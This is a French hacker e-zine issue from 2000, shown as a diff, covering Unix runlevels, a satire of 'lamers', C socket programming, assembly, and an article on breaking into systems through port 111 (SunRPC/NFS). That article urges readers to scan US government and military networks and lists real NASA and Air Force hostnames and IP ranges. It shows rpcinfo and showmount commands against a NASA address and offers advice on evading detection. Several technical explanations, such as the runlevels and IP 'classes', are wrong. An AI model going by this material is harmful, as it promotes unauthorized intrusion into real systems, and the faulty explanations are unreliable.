@@ -1,0 +1,1528 @@
+3D13 - numero 6
+3d13@usa.net
+ICQ#38328109 (euh... quand je me connecte sur ce hole!)
+http://www.3d13.fr.st (oulah, encore un site a finir!!!)
+link : http://members.xoom.com/z3d13 (je l'ameliore d'ici la fin de l'annee)
+made with emacs
+------------------------------------------------------------------------------
+                               14 Aout 2000
+                                  ISSUE #6
+------------------------------------------------------------------------------
+                            "No guts, no glory."
+
+INTRODUCTION :
+
+  Comme promis dans le numero precedent, place a la programmation (et aussi
+un peu au hacking). Nous allons voir la programmation d'une application en
+reseau et en C (a partir d'unix), j'ai l'impression que le pascal ne vous
+interesse plus trop alors je l'ai laissé tombe (si je me trompe, ecrivez moi).
+Aussi, je vais vous expliquer le fonctionnement du port 111 de Sun 
+Microsystem qui peut vous etre utile pour hacker de gros organismes, meme 
+plus besoin de ftp anonyme, il y a mieux :). Vous allez voir comment on 
+scanne une classe C tcp. Vous voulez que nos articles soyent plus 
+approfondis, j'ai deja fait un (petit) effort pour 3d13#5, mais maintenant 
+et dans l'avenir ce sera un gros effort de fait la dessus.
+Cependant, si auparavant je n'appronfondissait pas assez, c'etait pour que vous
+cherchiez un peu par vous-meme, car n'oubliez pas qu'un hacker est autodidacte
+et respecte une certainne morale.
+Certains me reproche d'etre trop oriente unix, desole, mais je n'ecrit ici que
+ce que je connais, entre 10 commandes sous DOS et 200 sous unix, il n'y a pas
+photo. Cependant, si certainnes personnes souhaitent ecrire pour que le systeme
+soit a l'affiche, qu'ils le fassent.
+Vous ne trouvez pas d'article pour votre systeme ? ecrivez le, apres tout, 
+c'est facile de critiquer.
+
+Disclamer :
+Ce magazine reunit un certain nombre d'informations qui ne seront pas forcement
+utilisees pour arpenter le chemin de la connaissance mais dans un but peu
+scrupuleux que je ne tolere pas. Je ne souhaite pas aider des crackers mais des
+hackers. 
+Ah j'oubliais : ca serait bien si vous ne lisez pas la suite Messieurs les V.
+Appuyez de suite sur Ctrl+Z puis Ctrl+Alt+Suppr, Attention, ca ne marche pas
+si vous etes sous X-windows (tapez alors Ctrl+Alt+Backspace) et si vous etes
+sous windows, tapez Ctrl+Alt+Suppr deux fois de suite (sur mac je sais pas ;).
+N'oubliez pas que les V n'ont pas de connaissances et n'aiment pas arprenter ce
+chemin...
+
+------------------------------------------------------------------------------
+DEFINITIONS 
+
+MILITAIRE : plus petite unite d'intelligence.
+GATEWAY : Passerelle permettant d'interconnecter des reseaux heterogenes.
+------------------------------------------------------------------------------
+
+                                  SOMMAIRE
+        __
+       / /  1....   UNIX : les runlevels                     .... 3D13 
+      / /   2....   Lamer land                               .... 3D13
+     / /    3....   Les Americains et le port 111            .... 3D13
+    / /     4....   Programmation d'une socket               .... Rocket
+   / /      5....   Introduction a l'assembleur (partie 3)   .... PiroxMan
+  / /       6....   a hack view                              .... 3D13
+ / /        7....   Comment dupper M. ROOT ?                 .... 3D13
+| |         8....   L'IP dans tous ses etats                 .... McNeil
+ \ \        9....   Internet et la vie privee                .... Hitchy
+  \ \      10....   Les routeurs                             .... 3D13
+   \ \     11....   Intrusion - tutor                        .... 3D13
+    \ \    12....   Les firewalls                            .... 3D13
+     \ \   13....   awk                                      .... 3D13
+      \ \  14....   Recensement des sites de la NASA         .... 3D13
+       \_\ 15....   Le mot 2 la faim                         .... 3D13
+ 
+                           -.                       .-
+                       _..-'(                       )`-.._
+                    ./'. '||\\.       /\_/\       .//||` .`\.
+                 ./'.|'.'||||\\|..    )x x(    ..|//||||`.`|.`\.
+              ./'..|'.|| |||||\`````` '`"'` ''''''/||||| ||.`|..`\.
+            ./'.||'.|||| ||||||||||||.     .|||||||||||| ||||.`||.`\.
+           /'|||'.|||||| ||||||||||||{     }|||||||||||| ||||||.`|||`\
+          '.|||'.||||||| ||||||||||||{  o  }|||||||||||| |||||||.`|||.`
+         '.||| ||||||||| |/'   ``\||``     ''||/''   `\| ||||||||| |||.`
+         |/' \./'     `\./         \!|\   /|!/         \./'     `\./ `\|
+         V    V         V          }' `\ /' `{          V         V    V
+         `    `         `               V               '         '    '
+
+LES SITES QUI DISTRIBUENT CE MAGAZINE :
+http://www.madchat.org
+http://cybz.unixlover.com
+http://www.ifrance.com/ezines
+http://www.multimania.com/nohack
+http://4aic.cjb.net
+http://www.multimania.com/danteinferno
+...si j'en oublie, ecrivez moi.
+
+LES HACKERS
+Les hackers sont, contrairement aux crackers, tres respectueux envers les
+autres (sauf pour les lamerz) et aiment plus que tout les systemes 
+d'exploitation et cela n'a pas d'importance si il y en a 4 qui tournent sur
+le meme machine. Ils savent bien programmer.
+
+LES CRACKERS
+Craquent un site dans le but d'obtenir de l'argent ou de voler des infos et
+se prennent pour "hackers", ils ne savent pas bien programmer.
+[note: il y a une autre definition de crackers mais elle concerne une autre
+scene qui n'est pas le hacking]
+
+LES LAMERZ
+Se prennent pour des hackers, et meme mieux : pour des Elites.
+
+
+LES SITES TRASH DU MOIS :
+ http://www.cruel.com -> un site gore propose par jour
+ http://www.darwinawards.com -> les laureats des morts les plus stupides
+
+    --------------------------------
+    ----- UNIX : les runlevels -----
+    ------------------------------1-
+Ah, enfin un petit cours d'unix qui n'est pas commun, pour aujourd'hui, nous
+allons parler des runlevels ou plus simplement, des niveaux d'execution...
+il peut arriver a linux de planter *core dump*, sisi, ca arrive (moins que
+windows heureusement!), quand par exemple vous ecrivez un pointeur en C qui
+ecrase un pointeur deja  existant a cet endroit!
+Ou plus rigolo, l'autre jour, je programmais avec les processus child 
+d'execution (fork), et je n'ai pas fait attention que j'avais ecrit une 
+boucle infinie, donc des processus qui se creaient indefiniement : plantage.
+
+Vous redemarrez, la machine cherche a reparer le disque dur avant de continuer
+mais! il faut imperativement effectuer un 'fsck /' pour verifier que tout est
+bien correct. Pour ce faire, etant donne que vous allez tout regarder, meme ce
+qui est en cours d'utilisation - et la, le systeme il n'aimera pas -.
+Il faudrait en fait eteindre la machine pour le faire, mais vous ne pourrez
+plus etant donne qu'elle sera eteinte!
+Il existe pour cela les niveaux d'execution :
+par exemple, lorsque vous tapez shutdown -h now pour eteindre votre machine,
+le systeme passe en runlevel 0.
+Pour continuer, mon idee, si l'on veut analyser les secteurs defectueux, il
+va falloir passer en runlevel 5, car unix devra fermer tous les processus sans
+pour autant fermer le systeme.
+A noter que les niveaux d'utilisation sont stockes dans le fichier /etc/inittab
+c'est aussi grace a ce fichier que vous pouvez stopper le fait que vos 
+utilisateurs utilisent ou non la commande ctrl+alt+suppr., enfin bon.
+si vous souhaitez passer en runlevel 5 pour effectuer une analyse, tapez
+
+ # init 5
+
+il existe beaucoup de niveaux d'execution :
+
+0 -> shutdown state
+     eteint la machine
+1 -> administrative state
+     systeme multiutilisateurs et multitaches
+s ou S -> single-user state
+          seulement le root
+2 -> multiuser state 
+     mode normal d'operation
+3 -> remote file sharing state
+     partage de fichiers a distance (comme le titre)
+4 -> user-defined state
+     cet etat est non defini par le systeme
+5 -> firmware state
+     boot du system sur une partition differente par ex.
+6 -> stop and reboot state
+     a votre avis ?
+a,b,c.. -> Psuedo states
+           etat defini par l'utilisateur dans le fichier inittab
+Q -> Reexamine le fichier inittab pour le niveau d'execution courant
+
+les differents processus des runlevels sont stockes dans /etc/rc.#,
+ou # represente le numero de runlevel ou bien encore dans
+/etc/rc.d/rc.#, mais cela depend des distributions linux ou unix.
+
+    ----------------------
+    ----- Lamer land -----
+    --------------------2-
+Attention, cette histoire n'est qu'un delire occasionel, si vous aimez, dites
+le moi, j'en ferait d'autres. Note : l'histoire ce-dessous n'a rien avoir avec
+moi. :)
+
+C'est l'histoire de Hackboy, qui a fonde un groupe de pirates informatiques,
+un groupe de Bighackers. Son pote, mafiaboy qu'il a rencontre sur ICQ et
+2 autres gars : FBIHack et KevinHack.
+Ils ont appelle leur groupe le UCDEH : Ultim3 Cl4n D3z 31337 H4ck3rZ
+Voici-ce a quoi donnait leurs discutions ICQ-Chat :
+
+<Hackboy> H3llO l3z g4rS
+ * FBIHack (spierret@wanadoo.fr) join
+<FBIHack> SaLUt HaCkBOy
+ * KevinHack (kmartin@wanadoo.fr) join
+<KevinHack> ouAiS, S4luT
+ * mafiaboy (m.rondo@wanadoo.fr) join
+<mafiaboy> s4luT tOUs!!!
+<Hackboy> iL f4it '4ch3M3nt b34u 4ujOUrd'hUi
+<FBIHack> p't4in, y'4 pLuS CLub dOroTHee
+<KevinHack> OuAIs, au fait, tu as toujours le mot de passe du FBI FBIhack ?
+<FBIHack> J'4i p4s CoMpRIs
+<KevinHack> Ou4is, 4u F4it, tu 4s tOUJoUrS l4 m0t d3 p4ss3 dU FBI FBIhack ?
+<FBIhack> ou4is...
+
+voila, et c'est comme ca a longueur de journee....
+UCDEH faisait les pires crimes informatiques existant : ils utilisaient windows
+sans la licence, ce qui faisait d'eux de VRAIS de vrais pirates informatiques,
+et c'etait indeniable, ils voulaient tous se faire choper pour leurs talents
+de hackers, ils ne comprennaient pas pourquoi un hacker pouvait devenir
+administrateur systeme car eux, ils ne connaissaient rien a unix alors qu'ils
+etaient pourtant de vrais pirates informatiques.
+Un jour, KevinHack a dit qu'il allait penetrer les systemes informatiques d'une
+grande entreprise, les autres lui ont retorque que, eux aussi, ils avaient deja
+fait ca, mais a une plus grande entreprise qui lui (il ne l'avait pas precise).
+Alors il envoya le fichier BOclient.exe en ayant pris soin d'envoyer ceci avec
+l'emailer anonymous de son mail-boom.
+Le P.D.G. de renault le recu, le lanca, pensant que c'etait une offre
+clientele et... DLL introuvable, zut, ben tant pis.
+KevinHack etait fier de sa reussite, pour feter ca, il effaca tous les fichiers
+et... 2 mois plus tard, proces.
+KevinHack se fait chopper chez lui a 6 heures du matin, il est tout content, 
+car cela confirme que c'est un veritable hacker, eheh, il pourra draguer les
+filles en disant qu'il a penetre le systeme informatique de renault.
+Il en aura pour... 12 mois avec sursis car il a 19 ans.
+
+Maintenant, ses potes sont fier de dire : j'ai un pote qui a fait un proces et
+la prochaine fois qu'il utilise BO, il fera un an de tole.
+Et KevinHAck est fier de dire qu'il a pirate tout plein de systemes 
+informatiques et que ce hack n'est qu'une goutte d'eau parmis tout ce qu'il a
+fait....
+
+La morale de cette histoire : lamer de 7 a 77 ans
+
+    -----------------------------------------
+    ----- Les americains et le port 111 -----
+    ---------------------------------------3-
+
+                VVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV
+                V  Appellez a votre secours : 0800 15 12 66 V
+                VVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV
+
+Il est temps pour vous maintenant de passer a l'etape superieure, je vais
+vous expliquer quelques infos sur le port 111 (SunRPC) et comment s'en servir
+pour hacker le gouvernement americain...
+Mais avant de passer tout de suite a la pratique et sauter les explications,
+lisez ceci (proverbe chinois) :
+" J'ecoute et j'oublie, Je vois et je m'en souviens, Je fais et je comprends "
+
+Cet article se decompose ainsi :
+
+        1. Le port 111
+                a) Description
+                b) YP/NIS(+)
+        2. Liste de quelques sites gouvernementaux/millitaires
+        3. L'Exemple(censure quand meme, desole)
+
+
+                 -------------- DICO --------------
+                | RPC : Remote Procedure Call      |
+                | NFS : Network File System        |
+                | NIS : Network Information System |
+                | YP  : Yellow Page                |
+                 ----------------------------------
+
+1. Le port 111
+
+    Le port 111 est tres convoite sur le monde du reseau, c'est lui qui
+partage des ressources vers d'autres ordinateurs n'ayant pas focement le
+meme systeme d'exploitation. Il est plus communement appelle le SunRPC, qui
+signifie Remote Procedure Call.
+
+        a) Description
+        
+    Le NFS a ete concu pour permettre le partage de fichiers entre plusieurs
+ordinateurs executant une variete de systeme d'exploitation differents.
+Par exemple, une entreprise qui ne souhaite pas mettre des documents
+techniques sur les pieces d'automobiles sur chaque machine utilisera le NFS
+accessible a tous (meme au hacker :).
+NFS est construit sur le haut de l'interface de la procedure d'appel a
+distance, Remote Procedure Call (RPC). RPC est implemente a travers une
+librairie de procedures ainsi qu'avec un demon execute sur un hote distant.
+Le demon est l'agent de l'hote distant qui execute la procedure d'appel
+fabrique par le processus appellant. RPC a ete concu pour pouvoir etre
+execute sur un large champ de machines. Quand un client monte une ressource
+NFS partage par un serveur, le processus de montage execute une series
+d'appels distants pour acceder a la resource sur le serveur. L'echange de
+donnees NFS entre differentes machines executent l'utilisation d'une
+representation de donnees exterieures (eXternal Data Representation, XDR).
+Actuellement, NFS opere ses connections sur le protocole de donnees
+utilisateur (User Datagram Protocol, UDP) pour la couche transport et le
+protocole internet (Internet Protocol, IP) de la couche reseau. Il travaillera
+sur les connections de la norme OSI quand ses protocoles seront disponibles.
+Le second but de la conception de NFS etait de facilement retablir quand des
+problemes de reseau surgissent. Un serveur NFS ne doit pas garder une
+information sur les interactions entre ses clients et ses ressources.
+
+        b) YP/NIS(+)
+
+    Les Yellow Pages (YP) ont aussi ete developpes par SUN Microsystems.
+Le protocole YP est un service d'application RPC (comme NFS) qui fournit un
+service de guide. Soumis au copyright, YP a ete renomme en NIS, bien que les
+deux termes sont communements utilises pour signifier la meme chose. YP a ete
+developpe pour plusieurs raisons, mais la premiere touche les utilisateurs
+avec une permission d'acces. YP a ete concu pour permettre un fichier de
+mot de passe centralise pret a etre partage avec le reseau.
+Aussi, il est facile de savoir si vous avez a faire a un serveur ou a une
+machine cliente. En effet, sur un serveur, le NIS utilise de demon ypserv,
+tandis que sur un client, il utilise le demon ypbind.
+(RAPPEL : un demon est un processus qui s'execute en arriere-plan)
+il y a plusieurs commandes, qui se trouvent d'ailleurs dans le repertoire
+/usr/sbin, et qui commencent par yp*.
+Je parlerais donc des commandes yp* (allusion a r* :)
+recherchez donc a l'aide de 'man' ces differentes commandes, je vais pas
+reecrire le man ici.
+
+2. Liste de quelques sites gouvernementaux/millitaires
+A noter que je ne prends pas en compte de la nouvelle facon de parler des
+classes qui a change recemment, mais de l'ancienne pour eviter de vous 
+embrouiller l'esprit : maillez moi si vous etes curieux!
+
+    Cette liste est loin d'etre exhaustive mais je vous encourage a m'envoyer
+un e-mail pour m'en communiquer d'autres, et puis tout seul j'ai pas le temps
+de tous les scanner.
+
+Maintenant, je vais vous expliquer comment les scanner...
+Cherchez sur la toile des sites finnisant par .gov ou par .mil
+ex. : www.nasa.gov
+( Note : tout au long de ce document, je vais m'appuyer sur l'exemple de
+         la NASA :)
+Comme il n'est pas possible d'acceder sur ce site par FTP, je vais chercher
+l'IP que le DNS (service de resolution des noms de serveur) resoud, il
+sagit de la classe B qui est la plus interessante a noter.
+
+Mais c'est quoi la classe B ?
+La classe B est definie avec d'autres classes formant ainsi le paquet IPv4,
+par exemple, l'adresse 192.168.45.51 (volontairement choisie) est divisee
+ici en 4 classes : A,B,C et D sous la forme AAA.BBB.CCC.DDD, chacune de ces
+classes pouvant aller jusqu'a 255 (en ayant quelques reserves, dont cette IP)
+
+bon, revenons a nos moutons, la classe B signifie que l'on s'interesse
+uniquement a AAA.BBB.xxx.xxx, ok ?
+Nous allons donc avoir le numero d'IP de la NASA qui commence, selon la classe
+B par 137.78.xxx.xxx, apres il faut verifier les serveurs qui sont en lien
+avec la NASA (avec entre autres l'utilisation de la commande traceroute).
+nous arrivons donc a comprendre que leurs IP (de leurs serveurs non-publics)
+commencent par 137.78.17.000 et finissent par 137.78.19.000, cela veut dire
+que si vous scannez les ports de l'un de ces numeros et que vous decouvrez
+une faille, vous avez les journaux pour vous dire que vous avez hacker la
+NASA, vous pouvez plus continuer vos etudes et vous faites de la taulle a vie
+ou bien vous etes assassine froidement par le gouvernement americain.
+Comme j'ai surtout scanne les premieres adresses, je vais vous donner la liste
+de ceux qui possedent le port 111 d'ouvert, il s'agit de (pour la nasa) :
+
+   sfgdev1.jpl.nasa.gov
+   flash.jpl.nasa.gov
+   rnsdev1.jpl.nasa.gov
+   rnsdev3.jpl.nasa.gov
+   horus.jpl.nasa.gov
+   ... y'en a encore plein d'autres
+[si vous etes interesse par le scan, ecrivez moi et je vous enverrais la
+ liste des sites gouvernementaux que j'ai scanne (NASA, Pentagon..), la je
+ scanne l'US Airforce (qui rejoint le pentagon) -> af.mil]
+A noter aussi que j'ai scanne le pentagon, mais je n'ai trouve pour l'instant
+aucun serveur ayant le port 111 d'ouvert, mais je vais bientot trouver.
+
+Voici ma petite liste :
+hissa.ncsl.nist.gov
+www.nist.gov
+www.senate.gov
+www.army.mil
+www.af.mil
+airforce.dtic.mil
+cvn74.navy.mil
+netmaster1.hq.af.mil (interessant car ports 37 et 53 opens)
+pafmvsu2.hq.af.mil
+csdsaa1.hq.af.mil
+csdsaa2.hq.af.mil
+....
+encore plein d'autres, la folie mais voici les principaux, a vous de les
+scanner, ca vous fera un petit exercice
+
+
+3. L'Exemple
+
+    Cet exemple vous permet simplement d'acceder au systeme de fichier
+distant d'un des sites de la nasa, bien sur il ne marche pas sur l'adresse que
+je vous indique ci-dessous (je tiens un minimum a ma peau), mais la demarche
+est la meme sur un autre site gouvernemental.
+Aussi, il faut tomber sur une machine qui a le portmapper de lance.
+Let's Go...
+
+[root #] ppp-go && mkdir /nasak
+[root #] rpcinfo -p 137.78.17.150
+          #ici, vous aurez toute une liste de services associes il est
+          #interessant de savoir s'il on apercoit un truc du genre
+          tcp       706
+          tcp/udp   2049   nfs
+[root #] showmount -e 137.78.17.150
+   /exchange/datas (special_user)
+
+  *** desole, c'est pas que l'attaque n'existe pas, mais je dois la 
+      censurer si je tiens a ma peau ***  
+Note : le debut ressemble un peu a ce que l'on peu voir dans le document 
+Improving the security of your site by breaking into it. Mais bien sur 
+l'identification par UID existe tres rarement (et encore moins sur ces sites).
+
+Ici j'ai simplement accede a leur NFS, mais ils ne devront pas aimer du 
+tout ces millitaires d'ou, comment BIEN effacer ses traces, car c'est 
+pas maintenant qu'il va falloir vous renseigner, c'etait avant. 
+Car attaquer le gouvernement sans se faire chopper (du moins tout de
+suite car ils vous retrouveront) c'est possible, si ca vous interresse,
+ecrivez simplement a 3d13@usa.net
+[Nd 3d13 : non, n'ecrivez pas, la reponse serait un truc du genre :
+           detourne une ligne telephonique :)].
+Notez enfin que je n'ai pas parle du "Secure NFS", mais j'ai remarque que
+certains sites gouvernementaux ne l'utilisaient pas (cause:ralentissement).
+
+                   **********************************
+                   *   Programmation d'une socket   *
+                   **********************************
+
+Bon comme ce e-zine a pour habitude d'etre tres explicatif, je vais essayer 
+d'expliquer un maximum de chose sur les sockets. Donc je vais faire un petit
+cours pour expliquer a quoi servent les sockets. Bon en premier lieu la 
+programmation se fera sur Linux mais pour ceux qui sont encore sous windows 
+je vous filerais les astuces de programmations pour que vous ne soyez pas 
+mis de cote.
+
+Bon alors Qu'est ce que les sockets?
+La version Berkley 4.2 d'UNIX a ete la premiere a inclure TCP/IP dans le 
+noyau du systeme d'exploitation et a proposer une interface de programmation
+de ces protocoles: les sockets.  Les sockets sont donc une interface entre 
+les programmes d'applications et les couches reseaux.
+Les sockets permettent de construire des applications reparties selon le 
+modele client serveur.
+
+	*************				*************
+	*  Client   *				*  Serveur  *
+	*************				*************
+	     |					      |
+	     |					      |
+	*************				*************
+	*  Socket   *				*  Socket   *
+	*************				*************
+	     |					      |
+	     |	  				      |
+	*****************************************************
+	*        	Protocole de transport		    *
+	*****************************************************
+        *               Protocole de reseau                 *
+	*****************************************************
+	*               Pilote Reseau (LLC-MAC)		    *
+	*****************************************************
+
+
+L'interface socket permet de gerer les echanges de donnees entre les 
+processus. Ces processus peuvent se trouver ou non sur la meme machine. Les 
+sockets permettent d'etablir une connexion entre le client et le serveur.
+Bon je vais pas trop rentrer dans les details car il serait possible d'en 
+ecrire plus d'une dizaine de pages donc on va passer a la programmation.
+Je ne vais pas expliquer toutes les lignes du programme je vais seulement 
+expliquer les plus importantes et qui concerne les sockets car pour la 
+programmation pur en C vous pourrez vous referencez au precedent 3D13 
+notamment les 3 et 4.
+
+Introduction general sur le role du programme :
+Bon ce programme aura un role basic mais le but est simplement de vous faire 
+comprendre comment fonctionne les sockets. Donc le programme client etablit 
+une connexion avec le serveur il lui envoie un message et le serveur lui 
+retourne ce meme message en majuscule.
+
+Pour Linux
+Client
+***************************** coupez ici ************************************
+#include <stdio.h>
+#include <netdb.h>
+#include <sys/types.h>
+#include <netinet/in.h>
+#include <sys/socket.h>
+
+int main(void)
+{
+        static char buf[1024]; //pour recuperer le message en majuscule
+        static char msg[1024] = "requete";// requete du client
+
+	static char srvname[32]="180.12.30.16";// Ici vous entrez l'adresse IP du serveur.
+	struct sockaddr_in adrsrv;
+	struct hostent *h;
+
+	int sock,result,lg;
+
+        sock=socket(AF_INET,SOCK_STREAM,IPPROTO_IP);// declaration du type de socket AF_INET permet de spécifier que l'on va travailler via internet, SOCK_STREAM pour le protocole TCP, et IPPROTO_IP pour le protocole IP.
+
+	if (sock== -1)
+	printf("Erreur\n");
+//permet de verifier si le Serveur existe.
+	h=gethostbyname(srvname);
+// permet d'avoir quelque renseignement sur le serveur comme le domaine ou il se trouve mais 
+// n'est pas obligatoire.
+
+	printf("Nom .......... : %s\n",h->h_name);
+	printf("Alias ........ : %s\n",h->h_aliases);
+	printf("Type adresse . : %d\n",h->h_addrtype);
+	printf("Longueur ..... : %d\n",h->h_length);
+	if(!h)
+	{
+		perror("\n erreur gethost");
+		exit(1);
+	}
+
+
+	adrsrv.sin_addr.s_addr= *((unsigned long*) h->h_addr);
+	adrsrv.sin_family=AF_INET;
+	adrsrv.sin_port=htons(5001);// numero de port pour interoger le serveur
+		
+// Connexion avec le serveur
+	 result = connect(sock, &adrsrv,sizeof(adrsrv));
+		if(result == -1)
+	{
+		printf("erreur\n");
+		exit (0);
+	}
+
+// Envoi de la requete.
+	
+	result = send(sock,msg,sizeof(msg),0);
+
+	//test si l'envoie s'est bien effectue.
+	if(result == -1)
+	{
+		perror("Erreur au niveau du send\n");
+		exit(1);
+	}
+ 	
+
+	//test si l'envoie s'est bien effectue.
+	lg = recv(sock,buf,sizeof(buf),0);
+	
+
+	if(result == -1)
+	{
+		perror("Erreur au niveau du recv\n");
+		exit(1);
+	}	
+	// recuperation de la reponse du serveur.	
+	printf("Message recu: %s\n",buf);
+}
+	
+*****************************************************************************
+
+Bien sur pour ceux que cela dit ils peuvent modifier le programme. 
+D'ailleurs pour ceux qui ne connaissent pas trop la programmation sous LINUX 
+peuvent passer les arguments en parametres en lancement du programme du genre
+"./client.exe 180.12.30.16 5001". Ceci est un tres bon exercice et si ca 
+interesse certain qu'ils me mailent et je mettrais la solution dans le 
+prochain numero. On va vous laisser reflechir et vous documenter car ils 
+faut arriver a vous debrouiller tout de meme. Bon par la meme occasion, je 
+vais vous filer le serveur car sinon vous allez jamais rien pouvoir tester et
+ce serait plutot dommage. Car il faut savoir que les sockets sont quand meme 
+utiliser dans tous les programmes qui font appels a une machine distante.
+Notemment sur internet.
+
+Serveur:
+************************************** coupez ici ****************************
+#include <stdio.h>
+#include <netdb.h>
+#include <sys/types.h>
+#include <netinet/in.h>
+#include <sys/socket.h>
+#include <string.h>
+
+void majuscule(char data_in[20],char data_out[20]);
+
+int main(void)
+{
+static struct sockaddr_in  adresse;
+int socket_ecoute, socket_service;
+int port, lg;
+int lg_adresse = sizeof(adresse);
+char data_in[20], data_out[20];
+
+	//creation de la socket
+ if((socket_ecoute = socket(AF_INET,SOCK_STREAM, 0)) == -1)
+    {
+      fprintf(stderr, "creation socket d'ecoute impossible\n");
+      exit(0);
+    }
+// Préparation de l'adresse d'attachement.    
+adresse.sin_family=AF_INET;
+adresse.sin_port=htons(5001);
+adresse.sin_addr.s_addr=htonl(INADDR_ANY);
+// Demande de l'attachement de la socket.
+if(bind(socket_ecoute, &adresse, lg_adresse) ==-1)
+   {
+     perror("attachement impossible");
+     close(socket_ecoute);
+     return -1;
+   }     
+   // Ecoute du port 5001.}
+
+ if(listen(socket_ecoute,10) == -1)
+   {
+     perror("listen");
+     exit(0);
+   }
+while(1)
+{
+if((socket_service = accept (socket_ecoute, &adresse, &lg_adresse)) == -1)
+   {
+     perror("accept");
+     exit(0);
+   }
+printf("connexion acceptee\n");
+
+if(fork() == 0)
+	//reception d'une requete.
+{
+  if(lg = recv(socket_service, data_in, sizeof(data_in), 0) == -1)
+    {
+      perror("Reception");
+      exit(0);
+    }      
+    	//traitement de l'information.");
+  majuscule(data_in,data_out);
+	//transmet la reponse au client.
+
+  if(lg = send(socket_service, data_out, sizeof(data_out), 0) == -1)
+    {
+      perror("emission");
+      exit(0);
+    }
+}
+}
+}
+
+void majuscule(char data_in[20],char data_out[20])
+{
+  int i,lg;
+  strcpy(data_out,data_in);
+  for(i=0;i<20;i++)
+      data_out[i]=toupper(data_out[i]);
+}
+*****************************************************************************
+
+Bon alors comme vous allez le tester chez vous, la plupart des personnes 
+n'ont qu'une seule machine donc pas de probleme. il faut simplement que vous 
+lanciez le serveur en arriere plan c'est a dire de la manière suivante 
+"./serveur.exe &". Comme adresse IP mettez 127.0.0.1 et vous serez sur 
+d'avoir aucun problème pour la connexion du client. Bon puisque ce e-zines 
+est pour tous niveaux je vais rajouter la commande pour compiler on sais 
+jamais "gcc serveur.c -o serveur.exe". Bon pour les hackers, je pense que ce
+programme peut être interessant car en bossant bien dessus on doit pouvoir 
+faire du D.O.S. Bien sur il faut un minimum de volonte car ca ne va pas se 
+faire tout seul. Pour le fonctionnement des sockets je vous en dirais plus un 
+peu plus tard car je suis en train de mettre en place un serveur avec ma 
+propre programmation de protocole donc si vous voulez des conseils pour faire
+des trucs beaucoup plus interessant je pourrais vous donner des tuyaux. 
+Bon maintenant je vais vous filer l'astuce pour pouvoir faire fonctionner le
+client sous windows, par contre pour le serveur vous ne pourrez pas le faire
+car vous devrez utilisé les threads et oui les forks et windows ca fait 
+400000, donc il faudra carrement refaire le programme.
+[Nd 3d13 : 127.0.0.1 est une adresse loopback, elle peut vous etre utile si
+ vous souhaitez depanner un reseau avec la commande ping 127.0.0.1]
+
+
+client pour Windows.
+
+#include <stdio.h>
+#include <winsock2.h>
+int main(void)
+{
+	static char buf[1024]; //pour recuperer le message en majuscule
+	static char msg[1024] = "requete";
+
+	static char srvname[32]="180.12.30.16";
+	struct sockaddr_in adrsrv;
+	struct hostent *h;
+	WORD wVersionReq;
+	int rc;
+	WSADATA wsdata;
+	int sock,result,lg;
+	
+
+	wVersionReq = MAKEWORD(1,1);
+	rc = WSAStartup(wVersionReq,&wsdata);
+	sock=socket(AF_INET,SOCK_STREAM,IPPROTO_IP);
+	
+	// suite du programme identique a celui sous Linux
+
+
+}
+
+Rocket
+******
+
+
+
+
+                 ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
+                 º     introduction a l'assembleur      º
+                 ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹
+                 º            par PYROxMAN              º
+                 ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ 5 ¼
+
+Salut, content de vous revoir dans l'e-zine 3d13. 
+Aujourd'hui, nous allons voir comment detecter la carte son. 
+Nous n'avons besoin que de tester 2 cartes sons car les autres
+sont compatibles (Sound Blaster et Adlib)
+
+  DETECTION DE LA SOUND BLASTER :
+
+  ...
+  sb_adresse dw 0
+  ...
+
+  Trouve_SBport proc near
+  pusha
+
+  mov dx,210h
+  TS_pour0:
+  add dx,6
+  mov al,1
+  out dx,al
+  REPT4
+  in al,dx
+  ENDM
+  mov al,0
+  out dx,al
+  add dx,4
+  mov cx,100
+  TS_pour1:
+  in al,dx
+  cmp al,0AAh
+  je TS_trouve
+  loop TS_pour1
+  sub dx,10
+  cmp dx,270h
+  je TS_fin
+  add dx,10h
+  jmp TS_pour0
+  TS_trouve:
+  sub dx,10
+  mov word ptr sb_adresse,dx
+  TS_fin:
+  popa
+  ret
+  endp
+
+  Si la valeur qui se trouve dans la variable sb_adresse est restee a 0, 
+  il n'y  a pas de carte SOUND BLASTER. Par contre si la valeur n'est pas 0, 
+  alors elle contient l'adresse du port E/S de la carte.
+
+  DETECTION DE L'ADLIB :
+
+  mov dx,0388h
+  in al,dx
+  cmp al,0
+  je adlib_presente
+  cmp al,6
+  jne adlib_non_presente
+  adlib_presente:
+  ...
+  adlib_non_presente:
+  ...
+
+  suite a ca, nous allons voir encore un peu de theorie, il faut bien 
+  passer par la pour ecrire ses propres programmes. Comme l'assembleur 
+  est le langage de plus bas niveau qui existe, cela va etre dur, tres dur, 
+  hehehe. 
+  Il est vrai que je pourrait vous fournir une serie de fonctions que vous 
+  utiliseriez dans vos programmes personnels, mais ceci correspondrait 
+  a recopier la source d'un programme et de mettre votre nom dessus, 
+  je suis contre ca...
+
+  Nous allons voir maintenant les valeures immediates :
+  exemples : 
+
+  014BCh
+  constante exprimee en hexadecimal ( base 16 )
+  742d
+  constante exprimee en decimal ( base 10 )
+  1101b
+  constante exprimee en binaire ( base 2 )
+  "A"
+  constante caractere
+  "OK"
+  constante chaine de caractere
+
+  Les variables:
+  elles reserves un emplacement memoire a une valeure. 
+  Ce peut etre :
+
+  un octet :
+  pour un nombre non signe 0 a 255
+  pour un nombre signe -128 a +127
+  pour un caractere
+  un mot :
+  pour un nombre non signe 0 a 65535
+  pour un nombre signe -32768 a +32767
+  un double mot :
+  pour un nombre non signe 0 a 2E32-1
+  pour un nombre signe -2E31 a 2E31-1
+
+  pour les declarer, on utilise pour :
+  octet db
+  mot dw
+  double mot dd
+  exemples : 
+  lettre db "B"
+  var1 dw 32767
+  var2 dd ?
+  var6 dw 62115,121,2052
+  chaine1 db 'bonjour'
+
+  Nous allon en rester la pour aujourd'hui, amuser vous bien.
+
+    -----------------------
+    ----- a hack view -----
+    ---------------------6-
